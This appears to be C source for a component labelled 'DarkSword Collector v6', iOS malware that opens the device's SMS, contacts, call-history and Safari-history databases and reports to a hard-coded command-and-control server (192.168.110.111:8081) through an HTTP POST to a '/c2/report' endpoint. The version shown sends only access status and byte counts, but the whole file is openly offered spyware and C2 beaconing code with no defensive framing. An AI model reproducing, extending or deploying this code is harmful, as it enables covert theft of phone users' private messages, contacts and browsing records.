/**
 * DarkSword Collector v6 - Standard C functions via PLT
 * Uses open/read/socket/connect/send through shared cache
 * MachOPayloadBuilder resolves PLT symbols with -bind_at_load
 */
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>

#define C2_HOST "192.168.110.111"
#define C2_PORT 8081

static char s_buf[2048];

static void _http_post(const char *body, int blen) {
    int h = snprintf(s_buf, sizeof(s_buf),
        "POST /api/v1/c2/report HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n\r\n",
        C2_HOST, C2_PORT, blen);

    if (h + blen < (int)sizeof(s_buf)) {
        memcpy(s_buf + h, body, blen);
        h += blen;
    }

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_HOST, &addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return;
    }
    send(sock, s_buf, h, 0);
    close(sock);
}

static void _report(const char *platform, const char *user, const char *token) {
    char body[512];
    snprintf(body, sizeof(body),
        "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\","
        "\"data\":{\"platform\":\"%s\",\"username\":\"%s\",\"token\":\"%s\"}}",
        platform, user, token);
    _http_post(body, strlen(body));
}

static void _collect(const char *path, const char *name) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        _report(name, "access_denied", path);
        return;
    }
    char data[256];
    int n = read(fd, data, sizeof(data) - 1);
    close(fd);
    if (n <= 0) n = 0;

    char result[128];
    snprintf(result, sizeof(result), "read_ok:%d_bytes", n);
    _report(name, "read_success", result);
}

void ds_start(void) {
    _report("Collector", "started", "v6");
    _collect("/var/mobile/Library/SMS/sms.db", "SMS");
    _collect("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", "Contacts");
    _collect("/var/mobile/Library/CallHistoryDB/CallHistory.storedata", "CallHistory");
    _collect("/var/mobile/Library/Safari/History.db", "Safari");
    _report("Collector", "done", "v6");
}